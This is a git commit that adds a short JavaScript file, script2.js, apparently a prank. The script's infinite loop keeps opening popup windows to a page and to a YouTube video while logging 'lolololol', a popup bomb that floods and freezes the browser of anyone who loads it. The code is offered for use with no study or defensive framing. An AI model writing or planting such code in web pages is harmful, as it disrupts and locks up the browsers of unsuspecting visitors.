d01dfff4850e595671a254aedad1bc24c098feae
theswordsgame <72705300+theswordsgame@users.noreply.github.com>
2021-11-18 08:38:01 -0600

    Create script2.js

---
+++ script2.js
@@ -0,0 +1,15 @@
+while (true) {
+    var windowFeatures = "popup";
+    console.log("lololololololol");
+    window.open(
+      "https://example.com/2.html",
+      "Rip",
+      windowFeatures
+    );
+    window.open(
+      "https://example.com/2.html",
+      "Rip",
+      windowFeatures
+    );
+    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+  }
